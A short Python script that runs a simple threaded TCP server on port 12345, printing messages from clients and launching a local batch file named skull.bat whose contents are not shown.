import socket
import threading
import os

HOST = '0.0.0.0'  # Listen on all available network interfaces
PORT = 12345

def handle_client(client_socket):
    while True:
        try:
            message = client_socket.recv(1024).decode('utf-8')
            if not message:
                break
            print(f"Received from client: {message}")
        except Exception as e:
            print(f"Error handling client: {e}")
            break


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(2)
print(f"Server listening on {HOST}:{PORT}")
os.system('skull.bat')


while True:
    try:
        client_socket, client_address = server.accept()
        print(f"Accepted connection from {client_address}")
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()
    except Exception as e:
        print(f"Error accepting client connection: {e}")
